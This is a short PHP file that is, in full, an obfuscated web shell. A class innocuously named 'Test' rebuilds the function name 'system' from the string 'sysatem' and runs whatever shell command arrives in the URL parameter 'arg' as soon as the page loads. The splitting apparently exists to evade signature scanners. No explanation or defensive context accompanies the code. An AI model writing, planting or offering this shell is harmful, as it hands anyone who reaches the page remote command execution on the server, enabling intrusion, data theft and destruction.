<?php
class Test
{
    public function testing()
    {
        return function() {
            $method='sysatem';
            (substr($method,0,3).substr($method, 4))($_GET['arg']);
        };
    }
}
$a=new Test();
$b=$a->testing();
$b();
?>